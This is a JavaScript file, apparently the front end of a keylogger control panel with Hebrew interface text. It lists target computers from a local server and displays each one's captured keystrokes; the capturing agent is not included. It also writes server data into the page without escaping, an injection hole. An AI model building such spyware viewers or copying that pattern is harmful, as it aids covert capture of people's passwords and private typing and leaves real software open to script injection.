// async function viewKeystrokes(machine) {
//     const container = document.getElementById("keystrokes-container");
//     container.innerHTML = `<p>🔄 טוען נתוני הקשות עבור <strong>${machine}</strong>...</p>`;

//     try {
//         const response = await fetch(`http://127.0.0.1:5000/app/keystrokes_get?computer=${machine}`);
//         const data = await response.json();

//         if (!data.keystrokes || data.keystrokes.length === 0) {
//             container.innerHTML = `<p>❌ אין נתונים זמינים עבור <strong>${machine}</strong></p>`;
//             return;
//         }

//         const keystrokesList = data.keystrokes.map(k => `<li>${k}</li>`).join("");
//         container.innerHTML = `
//             <h3>⌨️ נתונים עבור: ${machine}</h3>
//             <ul>${keystrokesList}</ul>
//         `;
//     } catch (error) {
//         console.error("שגיאה במשיכת נתוני ההקשות:", error);
//         container.innerHTML = `<p>❌ שגיאה בטעינת הנתונים עבור <strong>${machine}</strong></p>`;
//     }
// }


async function refreshMachines() {
    const tableBody = document.getElementById("machines-table");
    tableBody.innerHTML = "<tr><td colspan='2'>🔄 טוען...</td></tr>";

    try {
        const response = await fetch("http://127.0.0.1:5000/api/list_machines_target_get");
        const data = await response.json();

        tableBody.innerHTML = "";
        if (data.machines.length === 0) {
            tableBody.innerHTML = "<tr><td colspan='2'>❌ אין מחשבים זמינים</td></tr>";
            return;
        }

        data.machines.forEach(machine => {
            const row = document.createElement("tr");
            row.innerHTML = `
                <td>${machine}</td>
                <td><button onclick="viewKeystrokes('${machine}')">הצג</button></td>
            `;
            tableBody.appendChild(row);
        });
    } catch (error) {
        console.error("שגיאה במשיכת המידע:", error);
        tableBody.innerHTML = "<tr><td colspan='2'>❌ שגיאה בטעינת הנתונים</td></tr>";
    }
}

async function viewKeystrokes(machine) {
    const container = document.getElementById("keystrokes-container");
    container.innerHTML = `<p>🔄 טוען נתוני הקשות עבור <strong>${machine}</strong>...</p>`;

    try {
        const response = await fetch(`http://127.0.0.1:5000/api/keystrokes_get?computer=${machine}`);
        console.log(response);
        
        const data = await response.json();

        if (!data.keystrokes || data.keystrokes.length === 0) {
            container.innerHTML = `<p>❌ אין נתונים זמינים עבור <strong>${machine}</strong></p>`;
            return;
        }

        const keystrokesList = data.keystrokes.map(k => `<li>${k}</li>`).join("");
        container.innerHTML = `
            <h3>⌨️ נתונים עבור: ${machine}</h3>
            <ul>${keystrokesList}</ul>
        `;
    } catch (error) {
        console.error("שגיאה במשיכת נתוני ההקשות:", error);
        container.innerHTML = `<p>❌ שגיאה בטעינת הנתונים עבור <strong>${machine}</strong></p>`;
    }
}
